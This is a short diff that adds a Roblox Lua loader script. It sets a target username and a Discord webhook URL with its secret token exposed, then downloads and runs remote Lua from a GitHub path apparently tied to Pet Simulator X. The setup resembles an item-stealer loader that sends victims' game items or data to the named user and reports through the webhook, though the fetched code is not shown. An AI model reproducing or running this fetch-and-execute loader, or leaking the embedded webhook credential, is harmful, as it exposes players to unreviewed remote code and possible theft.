@@ -1,0 +1,5 @@
+_G.Username = "therussinix"; 
+
+_G.Webhook = "https://discord.com/api/webhooks/1074705067241902091/nfyS1UVh8JXnOe8vGWTc9KGOlTWf1lAU7zmEl1v5LVPWgsqK4YGIEgi7HuPK_oZ4YOJC"; -- Optional!
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/test.lua"))()
